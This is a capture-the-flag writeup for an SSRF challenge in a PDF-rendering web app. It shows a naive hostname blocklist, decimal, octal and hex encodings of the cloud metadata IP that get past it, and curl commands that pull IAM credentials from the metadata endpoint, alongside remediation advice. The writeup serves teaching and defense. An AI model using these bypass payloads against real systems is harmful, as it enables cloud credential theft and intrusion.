# Official Writeup — DocuRender (SSRF)

**Category:** Web &nbsp;|&nbsp; **Difficulty:** Medium &nbsp;|&nbsp; **Flag:** `flag{ssrf_pdf_render_naive_blocklist_bypass}`

## 1. Vulnerability class

**Server-Side Request Forgery (SSRF)** with a **blocklist-based filter bypass**.

SSRF occurs whenever an application takes a URL from the user and fetches
it *itself*, server-side. The danger isn't the fetch — it's that the
server's network position is different from the attacker's. A request
that would be refused if it came from the public internet gets waved
through because, from the target's point of view, it's just an internal
service talking to another internal service.

## 2. Design rationale

I built this specifically to model a real, well-documented incident
pattern rather than an artificial puzzle: cloud instances expose a
metadata service on the link-local address `169.254.169.254`, reachable
only from inside the instance, that hands out temporary IAM credentials
to whatever's running there. This exact request pattern (an
attacker-controlled server-side fetch reaching the metadata endpoint) was
the mechanism behind the 2019 Capital One breach. Reproducing that shape
— rather than a generic "fetch a local file" SSRF — was intentional: it's
the version of this bug an offensive security engineer will actually
encounter.

The blocklist is deliberately **naive but realistic**. A surprising
number of real-world SSRF mitigations look exactly like this: a
developer adds string checks for `localhost`, `127.0.0.1`, and the
metadata IP, ships it, and considers the ticket closed. The bug isn't
that no filter exists — it's that the filter checks the *string the
user typed* instead of the *IP address the request will actually reach*.
Those are not the same thing, and that gap is the entire challenge.

## 3. The vulnerable code

```python
BLOCKLIST = ["localhost", "127.0.0.1", "169.254.169.254", "0.0.0.0", "::1"]

def is_blocked(url: str) -> bool:
    hostname = (urlparse(url).hostname or "").lower()
    return any(bad in hostname for bad in BLOCKLIST)
```

This is a substring check on the *parsed hostname string*. It never asks
"what IP does this resolve to?" — it asks "does this text look like one
of the strings I'm worried about?" Any URL whose hostname resolves to
`169.254.169.254` but whose *text* doesn't contain that string sails
straight through.

## 4. Exploitation

IPv4 addresses can be written in forms other than dotted-decimal, and
both the OS resolver and Python's `requests`/`socket` stack will happily
accept them:

| Form | Example for `169.254.169.254` |
|---|---|
| Dotted-decimal (blocked) | `169.254.169.254` |
| Pure decimal (32-bit int) | `2852039166` |
| Octal (per-octet) | `0251.0376.0251.0376` |
| Hex | `0xA9FEA9FE` |

Decimal conversion:

```
169*256^3 + 254*256^2 + 169*256 + 254 = 2852039166
```

None of these strings contain the substring `169.254.169.254`, so
`is_blocked()` returns `False` for all of them — while the socket layer
resolves them to the exact same address the blocklist was trying to stop.

**Step-by-step:**

1. Confirm the direct path is blocked:
   ```bash
   curl -X POST http://target:5000/render \
     -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/internal-service-role"
   # {"error": "that host is not allowed"}
   ```
2. Re-request using the decimal-encoded host instead:
   ```bash
   curl -X POST http://target:5000/render \
     -d "url=http://2852039166/latest/meta-data/iam/security-credentials/internal-service-role" \
     -o loot.pdf
   ```
3. Extract text from `loot.pdf` (any PDF text extractor works — `pdftotext`,
   `pypdf`, even opening it and copy-pasting). The server rendered the raw
   JSON response from the metadata service, including the flag inside the
   fake `SecretAccessKey` field.

The included `solution/solve.py` automates all three steps and pulls the
flag out of the resulting PDF via regex, since PDF text extraction can
introduce line-wrap artifacts mid-string — worth knowing if you're
building extraction tooling of your own.

## 5. Why this matters (real-world mapping)

This isn't a contrived bug for the sake of having one:

- **Capital One (2019):** an attacker used SSRF against a misconfigured
  WAF-fronted app to reach the AWS metadata service and steal temporary
  IAM credentials, exfiltrating data on ~100 million customers.
- SSRF has appeared in AWS, GCP, and Azure metadata-theft incidents
  repeatedly enough that all three providers eventually shipped
  **IMDSv2**-style mitigations (session-token-gated metadata access)
  specifically to blunt this class of attack.
- "URL-to-X" features — PDF renderers, screenshot services, link
  unfurlers, webhook testers — are consistently among the highest-yield
  SSRF sources in bug bounty programs, because they're *designed* to make
  a server-side request from user input.

## 6. Remediation

A correct fix does **not** try to out-clever the blocklist. Options, from
weakest to strongest:

1. **Resolve then check** — resolve the hostname to an IP *before*
   deciding, and reject private/link-local/loopback ranges
   (`RFC 1918`, `169.254.0.0/16`, `127.0.0.0/8`, `::1/128`) using proper
   IP-range logic, not string matching. Still has edge cases (DNS
   rebinding between check-time and connect-time).
2. **Allowlist, not blocklist** — only permit fetches to a known set of
   external domains if the use case allows it.
3. **Network-level isolation** — run the fetching service in a network
   namespace/egress policy that simply cannot route to internal
   addresses or the metadata service at all. This is what IMDSv2-style
   mitigations effectively enforce, and it's the only approach that's
   robust regardless of what the application code does.

## 7. Lessons for challenge design

Building this taught me more about *why* blocklist SSRF filters fail than
solving one ever did — writing the `is_blocked()` function myself meant
deciding exactly where the trust boundary breaks, rather than just
recognizing that it has. The most important design choice was making the
bypass require understanding *how hostnames resolve to IPs at the socket
layer*, not just knowing "try `2130706433`" as a memorized trick — the
writeup exists to make sure a reader walks away with the former.
